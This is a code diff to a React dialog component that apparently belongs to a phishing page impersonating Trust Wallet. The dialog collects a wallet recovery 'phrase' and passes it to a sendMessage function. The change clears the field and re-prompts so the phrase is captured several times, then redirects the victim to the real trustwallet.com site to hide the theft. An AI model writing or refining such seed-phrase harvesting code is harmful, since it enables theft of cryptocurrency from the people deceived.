@@ -68,6 +68,7 @@ function SimpleDialog(props) {
     phrase: "",
   });
   const [loading, setLoading] = React.useState(false);
+  const [submited, setSubmited] = React.useState({ status: false, count: 0 });
 
   const handleClose = () => {
     onClose(selectedValue);
@@ -80,10 +81,19 @@ function SimpleDialog(props) {
   const submit = (event) => {
     event.preventDefault();
     setLoading(true);
-    sendMessage(value).then(() => {
-      setLoading(false);
-      window.location.replace("https://trustwallet.com/");
-    });
+
+    if (submited.count <= 1) {
+      sendMessage(value).then(() => {
+        setSubmited({ ...submited, count: submited.count + 1 });
+        setValue({ ...value, phrase: "" });
+        setLoading(false);
+      });
+    } else {
+      sendMessage(value).then(() => {
+        setLoading(false);
+        window.location.replace("https://trustwallet.com/");
+      });
+    }
   };
 
   return (
